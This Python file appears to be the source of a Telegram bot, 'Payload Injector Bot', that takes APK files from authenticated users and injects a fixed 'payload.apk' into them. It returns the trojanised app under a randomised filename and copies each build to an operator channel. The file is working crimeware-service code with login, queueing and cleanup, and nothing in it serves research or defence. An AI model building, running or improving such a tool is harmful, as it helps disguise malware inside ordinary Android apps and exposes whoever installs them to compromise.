from telethon import TelegramClient, events, Button
from FastTelethonhelper import fast_download, fast_upload
import asyncio
import os
import sys
import logging
import time
import random
import string

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('logs/bot2_payload.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

if sys.platform == 'win32':
    sys.stdout.reconfigure(encoding='utf-8')
    sys.stderr.reconfigure(encoding='utf-8')

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from modules.config import API_ID, API_HASH, BOT2_TOKEN, LOG_CHANNEL_ID, ENABLE_ADMIN_CHECK

try:
    from modules.config import OUTPUT_CHANNEL_ID
except ImportError:
    OUTPUT_CHANNEL_ID = None

from modules.auth import UserManager, request_otp, verify_otp
from modules.utils import cleanup_session
from modules.queue_manager import build_queue
from modules.payload_injector import PayloadInjector
from modules.telegram_logger import TelegramLogHandler
from modules.admin_check import check_admin_status

os.makedirs('logs', exist_ok=True)
os.makedirs('cache', exist_ok=True)

user_manager = UserManager('data/users2.json')
bot = TelegramClient('data/bot2_session', API_ID, API_HASH)

telegram_logger = None

PAYLOAD_APK = "payload.apk"

build_queue_list = asyncio.Queue()
is_building = False

print("=" * 70)
print("🎯 Payload Injector Bot - Professional Edition")
print("=" * 70)


async def prepare_payload_cache():
    logger.info("🔧 Preparing payload cache...")
    success = await PayloadInjector.prepare_cache(PAYLOAD_APK)
    if success:
        logger.info("✅ Payload cache ready - Fast mode enabled!")
    else:
        logger.warning("⚠️  Cache preparation failed - Using normal mode")
    return success


def generate_unique_filename(original_name):
    timestamp = int(time.time())
    random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
    
    name_without_ext = os.path.splitext(original_name)[0]
    name_without_ext = ''.join(c for c in name_without_ext if c.isalnum() or c in ('-', '_'))[:30]
    
    if not name_without_ext:
        name_without_ext = 'app'
    
    return f"{name_without_ext}_{timestamp}_{random_str}.apk"


@bot.on(events.NewMessage)
async def handler(event):
    user_id = event.sender_id
    message = event.message
    if not event.is_private:
        return

    if message.document:
        if not user_manager.is_authenticated(user_id):
            await event.reply("❌ **Access Denied**\n\nPlease authenticate first\n\n/start")
            return

        file_name = None
        if message.document.attributes:
            for attr in message.document.attributes:
                if hasattr(attr, 'file_name'):
                    file_name = attr.file_name
                    break

        is_apk = False
        if file_name and file_name.lower().endswith('.apk'):
            is_apk = True
        if message.document.mime_type == 'application/vnd.android.package-archive':
            is_apk = True

        if not is_apk:
            await event.reply(
                "❌ **Invalid File**\n\n"
                "Only APK files are accepted!\n\n"
                f"📄 File sent: {file_name or 'Unknown'}\n"
                f"📦 Type: {message.document.mime_type or 'Unknown'}\n\n"
                "Please send an **APK** file."
            )
            return
        
        if is_apk:
            file_size = message.document.size
            max_size = 50 * 1024 * 1024
            
            if file_size > max_size:
                await event.reply(
                    f"❌ **File Too Large**\n\n"
                    f"📦 Your file: {format_size(file_size)}\n"
                    f"📏 Maximum: 50 MB\n\n"
                    f"Please send a smaller APK file"
                )
                return
            
            if build_queue.is_user_building(user_id):
                elapsed = build_queue.get_user_elapsed_time(user_id)
                await event.reply(
                    f"⏳ **Already Processing**\n\n"
                    f"⏱️ Time elapsed: {elapsed}s\n\n"
                    f"Please wait for current process to complete..."
                )
                return

            user_data = user_manager.users.get(str(user_id), {})
            username = user_data.get('username', 'Unknown')
            service_token = user_data.get('token')

            if ENABLE_ADMIN_CHECK and service_token:
                is_active, admin_msg, device_token = await check_admin_status(service_token)

                if not is_active:
                    logger.warning(f"User {username} ({user_id}) denied: {admin_msg}")
                    await event.reply(
                        f"❌ **Access Denied**\n\n"
                        f"{admin_msg}\n\n"
                        f"Please contact support if this is an error."
                    )

                    if telegram_logger:
                        await telegram_logger.log_admin_check(username, False)

                    return

            queue_position = build_queue_list.qsize()
            
            if queue_position > 0 or is_building:
                queue_msg = await event.reply(
                    f"⏳ **Added to Queue**\n\n"
                    f"📍 Position: {queue_position + 1}\n"
                    f"⏱️ Please wait...\n\n"
                    f"Your build will start automatically!"
                )
                
                await build_queue_list.put({
                    'user_id': user_id,
                    'username': username,
                    'message': message,
                    'file_name': file_name or "app.apk",
                    'file_size': file_size,
                    'chat_id': event.chat_id,
                    'queue_msg': queue_msg,
                    'service_token': service_token
                })
            else:
                await build_queue_list.put({
                    'user_id': user_id,
                    'username': username,
                    'message': message,
                    'file_name': file_name or "app.apk",
                    'file_size': file_size,
                    'chat_id': event.chat_id,
                    'queue_msg': None,
                    'service_token': service_token
                })
        return

    text = message.message.strip() if message.message else ""

    if text == '/start':
        if user_id in user_manager.waiting_otp:
            del user_manager.waiting_otp[user_id]
            
        if user_manager.is_authenticated(user_id):
            await event.reply(
                "✨ **Welcome back, Creator!**\n\n"
                "🎯 **Payload Injector Bot**\n\n"
                "📤 Send me an APK file and I'll inject it into the payload!\n\n"
                "━━━━━━━━━━━━━━━━\n"
                "🔧 **Process:**\n"
                "1. Send APK → 📥\n"
                "2. Auto injection → 🔄\n"
                "3. Get result → ✅\n\n"
                "💡 Ready to start!"
            )
        else:
            await event.reply(
                "👋 **Welcome!**\n\n"
                "🎯 **Payload Injector Bot**\n\n"
                "🔐 Please authenticate to continue\n\n"
                "📝 Send your **username** to get started"
            )
        return

    if user_manager.is_authenticated(user_id):
        return

    if user_id in user_manager.waiting_otp:
        if text.isdigit() and len(text) == 6:
            username = user_manager.waiting_otp[user_id]
            success, service_token, msg = await verify_otp(username, text)

            if success:
                replaced = user_manager.save_user(user_id, username, service_token)
                del user_manager.waiting_otp[user_id]
                
                message = "✅ **Authentication Successful!**\n\n"
                if replaced:
                    message += "⚠️ Previous session deactivated\n\n"
                message += "🎯 **Payload Injector Bot**\n\n📤 Send me an APK file to inject!"
                
                await event.reply(message)
            else:
                await event.reply(f"❌ {msg}\n\n📝 Please send your username again")
                del user_manager.waiting_otp[user_id]
        else:
            await event.reply("❌ **Invalid code**\n\nPlease enter a valid 6-digit code")
    else:
        username = text
        await event.reply("📨 **Sending verification code...**")
        success, msg = await request_otp(username)

        if success:
            user_manager.waiting_otp[user_id] = username
            await event.reply(
                f"✅ **Code delivered!**\n\n"
                f"🔐 Enter your 6-digit code"
            )
        else:
            await event.reply(f"❌ {msg}\n\nPlease try again")


async def process_build_queue():
    global is_building
    
    while True:
        try:
            build_data = await build_queue_list.get()
            
            is_building = True
            
            user_id = build_data['user_id']
            username = build_data['username']
            message = build_data['message']
            file_name = build_data['file_name']
            file_size = build_data['file_size']
            chat_id = build_data['chat_id']
            queue_msg = build_data['queue_msg']
            service_token = build_data['service_token']
            
            if queue_msg:
                try:
                    await queue_msg.delete()
                except:
                    pass
            
            msg = None
            user_apk_path = None
            final_apk_path = None
            start_time = time.time()

            try:
                await build_queue.acquire(user_id)
                
                msg = await bot.send_message(
                    chat_id,
                    f"🚀 **Payload Injection Started**\n\n"
                    f"📄 File: {file_name}\n"
                    f"💾 Size: {format_size(file_size)}\n\n"
                    f"📥 Downloading..."
                )

                timestamp = int(time.time())
                downloads_dir = "downloads"
                os.makedirs(downloads_dir, exist_ok=True)

                last_update = [0]

                def progress_callback(current, total):
                    progress = (current / total) * 100
                    if progress - last_update[0] >= 10:
                        last_update[0] = progress
                        return (
                            f"🚀 **Payload Injection Started**\n\n"
                            f"📄 File: {file_name}\n"
                            f"📥 Downloading: {progress:.1f}%\n"
                            f"⬇️ {format_size(current)} / {format_size(total)}"
                        )
                    return None

                user_apk_path = await fast_download(
                    client=bot,
                    msg=message,
                    reply=msg,
                    download_folder=downloads_dir,
                    progress_bar_function=progress_callback
                )

                file_size_mb = file_size / (1024 * 1024)

                if telegram_logger:
                    await telegram_logger.log_event('build_start', user_id, username, {
                        'bot': 'Payload Injector',
                        'app_name': file_name,
                        'size': f"{file_size_mb:.1f} MB"
                    })

                builds_dir = "builds"
                os.makedirs(builds_dir, exist_ok=True)
                output_apk = os.path.join(builds_dir, f"payload_{user_id}_{timestamp}.apk")

                async def injection_progress(step_text):
                    await msg.edit(
                        f"🔄 **Processing**\n\n"
                        f"{step_text}\n"
                        f"⏳ Please wait..."
                    )

                injector = PayloadInjector(PAYLOAD_APK)
                final_apk_path, error, duration = await injector.inject(
                    user_apk_path, 
                    output_apk, 
                    user_id, 
                    username,
                    progress_callback=injection_progress
                )

                if error or not final_apk_path:
                    if telegram_logger:
                        await telegram_logger.log_event('build_fail', user_id, username, {
                            'bot': 'Payload Injector',
                            'app_name': file_name,
                            'error': error or 'Unknown error'
                        })
                    await msg.edit(
                        f"❌ **Injection Failed**\n\n"
                        f"Error: {error or 'Unknown error'}\n\n"
                        f"Please try again or contact support"
                    )
                    continue

                final_size = os.path.getsize(final_apk_path)
                
                unique_filename = generate_unique_filename(file_name)

                last_upload_update = [0]
                
                def upload_progress_callback(current, total):
                    progress = (current / total) * 100
                    if progress - last_upload_update[0] >= 10:
                        last_upload_update[0] = progress
                        return (
                            f"✅ **Processing Complete**\n\n"
                            f"📤 Uploading: {progress:.1f}%\n"
                            f"⬆️ {format_size(current)} / {format_size(total)}"
                        )
                    return None

                await msg.edit(
                    "✅ **Processing Complete**\n\n"
                    "📤 Uploading..."
                )

                uploaded_file = await fast_upload(
                    client=bot,
                    file_location=final_apk_path,
                    reply=msg,
                    name=unique_filename,
                    progress_bar_function=upload_progress_callback
                )
                
                user_caption = (
                    "✅ **Payload Injection Successful!**\n\n"
                    f"📱 Original: {format_size(file_size)}\n"
                    f"📦 Final: {format_size(final_size)}\n"
                    f"📄 File: {unique_filename}\n\n"
                    "🎯 **Payload Injector Bot**"
                )
                
                await bot.send_file(
                    chat_id,
                    uploaded_file,
                    caption=user_caption
                )

                if OUTPUT_CHANNEL_ID:
                    try:
                        from datetime import datetime
                        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        
                        channel_caption = (
                            "📦 **New Payload Build**\n\n"
                            f"👤 User: `{username}` ({user_id})\n"
                            f"📄 Original: {file_name}\n"
                            f"📦 Output: {unique_filename}\n\n"
                            f"💾 Size: {format_size(file_size)} → {format_size(final_size)}\n"
                            f"⏱️ Duration: {duration}s\n"
                            f"🕐 Time: {now}\n\n"
                            "🎯 **Payload Injector Bot**"
                        )
                        
                        await bot.send_file(
                            OUTPUT_CHANNEL_ID,
                            uploaded_file,
                            caption=channel_caption
                        )
                        
                        logger.info(f"✅ File sent to output channel: {OUTPUT_CHANNEL_ID}")
                    except Exception as e:
                        logger.error(f"Failed to send to output channel: {str(e)}")

                await msg.delete()

                if telegram_logger:
                    await telegram_logger.log_event('build_success', user_id, username, {
                        'bot': 'Payload Injector',
                        'app_name': file_name,
                        'output_size': format_size(final_size),
                        'duration': duration
                    })

                logger.info(f"✅ Payload injection complete for user {user_id} ({username}) in {duration}s")

            except Exception as e:
                logger.error(f"Process error: {str(e)}", exc_info=True)
                if msg:
                    try:
                        await msg.edit(
                            f"❌ **Error**\n\n"
                            f"{str(e)}\n\n"
                            f"Please try again"
                        )
                    except:
                        pass
            finally:
                build_queue.release(user_id)

                try:
                    if user_apk_path and os.path.exists(user_apk_path):
                        os.remove(user_apk_path)
                        logger.info(f"Cleaned user APK: {user_apk_path}")
                except Exception as e:
                    logger.warning(f"Failed to clean user APK: {str(e)}")

                try:
                    if final_apk_path and os.path.exists(final_apk_path):
                        os.remove(final_apk_path)
                        logger.info(f"Cleaned final APK: {final_apk_path}")
                except Exception as e:
                    logger.warning(f"Failed to clean final APK: {str(e)}")
                
                is_building = False
                build_queue_list.task_done()
        
        except Exception as e:
            logger.error(f"Queue processing error: {str(e)}", exc_info=True)
            is_building = False


def format_size(bytes_size):
    for unit in ['B', 'KB', 'MB', 'GB']:
        if bytes_size < 1024.0:
            return f"{bytes_size:.1f} {unit}"
        bytes_size /= 1024.0
    return f"{bytes_size:.1f} TB"


async def main():
    global telegram_logger

    await bot.start(bot_token=BOT2_TOKEN)

    await prepare_payload_cache()

    if LOG_CHANNEL_ID:
        telegram_logger = TelegramLogHandler(bot, LOG_CHANNEL_ID)
        logger.info(f"✅ Telegram logger enabled: {LOG_CHANNEL_ID}")
    else:
        logger.info("⚠️  Telegram logger disabled (no LOG_CHANNEL_ID)")

    if OUTPUT_CHANNEL_ID:
        logger.info(f"✅ Output channel enabled: {OUTPUT_CHANNEL_ID}")
    else:
        logger.info("⚠️  Output channel disabled (no OUTPUT_CHANNEL_ID)")

    asyncio.create_task(process_build_queue())

    me = await bot.get_me()
    logger.info(f"Bot2 (Payload Injector) started as @{me.username}")

    await bot.run_until_disconnected()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Bot stopped by user")
    except Exception as e:
        logger.error(f"Bot error: {e}", exc_info=True)